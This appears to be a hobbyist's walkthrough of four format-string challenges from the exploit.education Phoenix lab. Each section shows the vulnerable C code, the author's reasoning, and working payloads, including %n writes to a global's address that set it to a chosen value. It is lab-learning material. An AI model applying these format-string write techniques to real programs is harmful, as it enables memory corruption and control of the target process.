# Format Zero
Heres the code we are trying to break:
```C
int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```
So we basically need the first 15 bytes of the buffer we supply to expand to something larger than the 32 bytes reserved for it in memory. 

%Nx will format to N characters of hex. So lets give it %33x and see what happens:

```bash
$ ./f0
Welcome to FORMAT ZERO, brought to you by https://exploit.education
%33x
Well done, the 'changeme' variable has been changed!
```
Nice :D


# Format One
Alright lets take a look at the code for this one...
```C
int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0x45764f6c) { // lOvE
    printf("Uh oh, 'changeme' is not the magic value, it is 0x%08x\n",
        locals.changeme);
  } else {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  }

  exit(0);
}
```
Ok so similar to last time but now we want to actually change that variable to a specific value 
(EvOl but stored backwards in memore so actually: lOvE)

well kinda easy then we know %32x will fill those so just tag on some lOvE xD
```bash
$ ./f1
Welcome to Format One, brought to you by https://exploit.education
%32xlOvE
Well done, the 'changeme' variable has been changed correctly!
```


# Format Two
Okay probably going to start getting harder now... lets take a look at the code:
```C
int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[256];

  printf("%s\n", BANNER);

  if (argc > 1) {
    memset(buf, 0, sizeof(buf));
    strncpy(buf, argv[1], sizeof(buf));
    bounce(buf);
  }

  if (changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    puts("Better luck next time!\n");
  }

  exit(0);
}
```

Ahhhh ok. So this is getting harder. I had to check where global are stored because theres nothing in the stack
to see how we can change this with anything done previous. I think what we are looking for is writing to arbitrary
memory locations. 

```asm
   0x5655626f <+107>:	call   0x56556090 <strncpy@plt>
   0x56556274 <+112>:	add    $0x10,%esp
   0x56556277 <+115>:	sub    $0xc,%esp
   0x5655627a <+118>:	lea    -0x118(%ebp),%eax
--Type <RET> for more, q to quit, c to continue without paging--c
   0x56556280 <+124>:	push   %eax
   c <+125>:	call   0x565561dd <bounce>
   0x56556286 <+130>:	add    $0x10,%esp
   0x56556289 <+133>:	mov    0x44(%ebx),%eax				<====== ebx+44
   0x5655628f <+139>:	test   %eax,%eax
   0x56556291 <+141>:	je     0x565562a7 <main+163>
```
okay so this is the snippet of code just before and after the check of the global
 set a breakpoint so we can check the value of changme/location:
```bash
$ objdump -t f2 | grep changeme
0000400c g     O .bss	00000004              changeme
```
And trying this we can find our argument on the stack: 

```
$ ./f2 %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Welcome to Format Two, brought to you by https://exploit.education
0xffffd100.0x3.0x565561e9.0xffffd210.0x56558fc8.0xffffd1f8.0x56556286.0xffffd0e0.0xffffd46b.0x100.0x5655621f.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70Better luck next time!
```

Okay so 12th argument hits our input, lets craft a payload 

```python
payload = p32(0x5655900c) // Address of changeme at runtime using GDB
payload += b'\x90'*12
payload += b'%12$n'
open('payload_f2','wb').write(payload)
```
And then inside GDB and pausing at main+133 we see:
```
gef➤  x/12w $ebx+0x44
0x5655900c <changeme>:	0x10	0x0	0x0	0x0
0x5655901c:	0x0	0x0	0x0	0x0
0x5655902c:	0x0	0x0	0x0	0x0
```
**We changed it!** 
```
�UV������������Well done, the 'changeme' variable has been changed correctly!
[Inferior 1 (process 1964008) exited normally]
```
# Format Three
Okay so lets find the global:
```
$ objdump -t f3 | grep changeme
0000400c g     O .bss	00000004              changeme
```
Great same location. What about the code being exploited:
```C
int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[4096];
  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);

  if (changeme == 0x64457845) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    printf(
        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
  }

  exit(0);
}
```
so we need to change the value of the global to specifically: b'ExEd' this time..
```python
payload = p32(0x5655900c) # Address of changeme at runtime using GDB
payload += b'A'*4000 # we have a HUGE 4096 size buffer this time
payload += b'%12$n'
open('payload_f3','wb').write(payload)
```

And then trying it in GDB what do we get
```
gef➤  r $(cat payload_f3 )
Starting program: /home/xxxx/phoenix/formats/f3 $(cat payload_f3 )
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to Format Three, brought to you by https://exploit.education


Better luck next time - got 0x00000000, wanted 0x64457845!
[Inferior 1 (process 1964121) exited normally]

Okay interesting so the size of the input seems to be what is overwriting changeme...
but we cant send in 0x64457845 characters thats insane... or maybe we can send something that will expand INTO that many characters? 

 Better luck next time - got 0x00000fa4, wanted 0x64457845!
 ```
 Huh... so the hex value is the number of bytes our input expands to.. well we can use the trick from earlier to expand small format string into many more bytes, so lets try that??
```python
payload = p32(0x5655900c) # Address of changeme at runtime using GDB
payload += b'%64457845x'
payload += b'%12$n'
open('payload_f3','wb').write(payload)
```

**HOLY SH*T LOL GDB GOES INSANE** 
```
0Better luck next time - got 0x03d78c79, wanted 0x64457845!
[Inferior 1 (process 1964189) exited normally]
```
HMMMMMMMMMMMM......almost but not quite.

*OH IM SO DUMB* its in hex so we have to send that value converted to an int and subtract 4
(because size of address we're overwriting is 4

```python
payload = p32(0x5655900c) # Address of changeme at runtime using GDB
payload += b'%1682274369x'
payload += b'%12$n'
open('payload_f3','wb').write(payload)
```
AND VOILA:
``` 0Well done, the 'changeme' variable has been changed correctly! ```
**YAY XDDDDDDD**
